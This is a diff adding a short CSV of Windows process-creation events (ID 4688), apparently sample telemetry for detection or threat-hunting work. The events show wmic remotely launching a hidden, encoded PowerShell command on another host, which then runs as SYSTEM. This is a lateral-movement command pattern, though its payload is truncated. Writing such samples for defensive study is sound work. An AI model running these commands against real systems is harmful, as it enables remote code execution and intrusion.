@@ -1,0 +1,3 @@
+TimeCreated,Computer,EventID,NewProcessName,ParentProcessName,CommandLine,SubjectUserName
+2025-08-16T02:41:12+05:30,WS-100,4688,C:\Windows\System32\wbem\wmic.exe,C:\Windows\System32\cmd.exe,"wmic /node:10.10.5.21 process call create ""powershell -nop -w hidden -enc SQBFAFgA...""",jane.doe
+2025-08-16T02:43:14+05:30,WS-305,4688,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,powershell.exe -nop -w hidden -enc SQBFAFgA...,SYSTEM
